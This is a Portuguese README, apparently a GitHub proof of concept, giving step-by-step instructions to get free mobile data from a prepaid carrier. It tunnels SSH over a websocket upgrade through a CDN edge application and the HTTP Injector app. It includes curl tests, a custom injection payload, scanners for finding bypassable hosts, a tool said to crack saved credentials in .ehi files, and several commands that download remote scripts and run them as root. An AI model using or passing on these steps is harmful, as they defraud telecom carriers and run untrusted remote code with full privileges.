# Netfree-proxy
POC de Netfree

Baseado no exploit original exposto no final de 2022 nos grupos telegram, segue o passo a passo de como reproduzir.
* Script Original: https://github.com/leitura/ws/blob/main/ws
* Autor: @OMentalista (telegram)

Step-by-step
============

1. Primeiramente precisamos de uma VM com IP publico na rede e acesso ssh sem firewall. Ex.
```
ssh root@142.93.9.181
```
(obs: tenha um usuario non-root para os testes.. Neste exemplo: user: nes / pass: ***)

2. Suba o proxy.py (código usado pelos Netfree)

3. Deixe o proxy rodando
```
nohup python proxy.py -p 81 &
```

4. Testando conexão local
```
curl http://142.93.9.181:81 -v
*   Trying 142.93.9.181:81...
* Connected to 142.93.9.181 (142.93.9.181) port 81 (#0)
> GET / HTTP/1.1
> Host: 142.93.9.181:81
> User-Agent: curl/7.77.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 101 Switching Protocols 
< Upgrade: websocket 
< Connection: Upgrade
< 
SSH-2.0-OpenSSH_7.4
```

5. Configurar um Edge application apontando para a origem 142.93.9.181:81 e um domain para testes
 
6. Teste feito em uma Edge Application com websocket ligado.
```
curl -v http://201.21.211.115 -H 'Host: xlm94s2zs8.map.acionedge.net' -H 'Connection: Upgrade' -H 'Upgrade: Websocket'
*   Trying 201.21.211.115:80...
* Connected to 201.21.211.115 (201.21.211.115) port 80 (#0)
> GET / HTTP/1.1
> Host: xlm94s2zs8.map.acionedge.net
> User-Agent: curl/7.77.0
> Accept: */*
> Connection: Upgrade
> Upgrade: Websocket
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 101 Switching Protocols 
< Date: Tue, 16 Aug 2022 13:48:08 GMT
< Connection: upgrade
< Upgrade: websocket
< 
SSH-2.0-OpenSSH_7.4
```

7. Teste da conf em uma Edge Application com websocket desligado.
```
curl -v http://xlm94s2zs8.map.acionedge.net -H 'Connection: Upgrade' -H 'Upgrade: Websocket'
# Não haverá o retorno do switching protocols
```

8. Plus - Create a hot domain to be used with this cname: 
```
dig websocket.httpbin.xyz
curl -v http://websocket.httpbin.xyz -H 'Connection: Upgrade' -H 'Upgrade: Websocket'
```

9. Em um Android Baixar o HTTP Injector na PlayStore

10. Configurar o Tunnel:
```
Tunnel Type: Secure Shell (SSH)
Connect From: HTTP Proxy
Options: Custom Payload
[SAVE]
```

12. Configurar o Payload:
```
GET / HTTP/1.1[crlf]Host: websocket.httpbin.xyz[clrf]Connection: Upgrade[clrf]Upgrade: websocket[clrf][clrf]
```

14. Configurar o Remote Proxy:
```
websocket.httpbin.xyz:80
```

16. Configurar o Settings/Secure Shell (SSH)
```
SSH Host: websocket.httpbin.xyz
SSH Port: 80
Username: nes
Password: ***
```
(obs - configurar uma conta de user qquer no seu servidor SSH que foi criada la no passo 1)


A partir daqui é possivel acessar a internet pelo tunel configurado sem que seus creditos pre-pagos sejam consumidos.
Mesmo zerando os creditos da Claro, foi possivel continuar navegando no youtube, playstore, e outros serviços mesmo não sendo HTTP ou zero-rating hosts.


Grupos no Telegram
==================

Busque por "Netfree", "HttpInjector", "HttpInjectorX9", etc.

Abaixo uma lista de ferramentas compiladas:

1. HTTPInjector 
* https://play.google.com/store/apps/details?id=com.evozi.injector&hl=pt_BR
* É um client VPN universal (SSH/Proxy/SSL Tunnel/DNS Tunnel/Shadowsocks/V2Ray/Xray/Hysteria/Wireguard)
* Salva as configurações em .ehi 
2. HTTPInjectorX9
* É um script em lua (x9.lua) usado para crackear o conteúdo de arquivos .ehi (inclusive user/pass salvos)
3. Subfinder
* https://github.com/projectdiscovery/subfinder
* subdomain discovery tool that returns valid subdomains for websites, using passive online sources. 
```
subfinder -d example.com -o exemplo.com.lst
```

4. Bug scanner do group @darktunnel_group (telegram)
* https://github.com/aztecrabbit/bugscanner-go
* Scan da lista gerada pelo subfinder
```
bugscanner-go scan direct -f exemplo.com.lst -o cf.lst
```
* scan CDN SSL:
```
bugscanner-go scan cdn-ssl --proxy-filename cf.lst --target ws.exemplo.com
```
* Scan Server Name Indication (SNI):
```
bugscanner-go scan sni -f exemplo.com.lst --threads 16 --timeout 8 --deep 3
```

5. Scripts do @OMentalista (telegram)
* SSHPLUS - https://github.com/leitura/SSHPLUS
```
apt update -y && apt upgrade -y && wget https://raw.githubusercontent.com/leitura/SSHPLUS/master/Plus && chmod 777 Plus && ./Plus
```
* SCRIPT SSL WS - https://github.com/leitura/ws
```
wget https://raw.githubusercontent.com/leitura/ws/main/ws && chmod +x ws && ./ws
```
* SCRIPT SENHA ROOT - https://github.com/leitura/senharoot
```
bash <(wget -qO- https://raw.githubusercontent.com/leitura/senharoot/main/senharoot.sh)
```
